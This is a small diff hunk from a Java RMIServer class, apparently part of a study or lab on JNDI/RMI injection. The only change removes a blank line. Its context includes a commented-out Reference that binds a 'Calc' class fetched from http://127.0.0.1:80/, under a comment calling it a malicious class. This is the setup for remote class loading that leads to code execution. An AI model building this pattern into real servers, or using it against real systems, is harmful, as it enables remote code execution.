@@ -15,7 +15,6 @@ public class RMIServer {
         ObjectInterface exp = new Object();
         registry.rebind("exp",exp);//rebind不抛出异常
         System.out.println("RMIServer ready");
-
         //RMIServer远程绑定恶意类
         /*
         Reference reference = new Reference("Calc","Calc","http://127.0.0.1:80/");
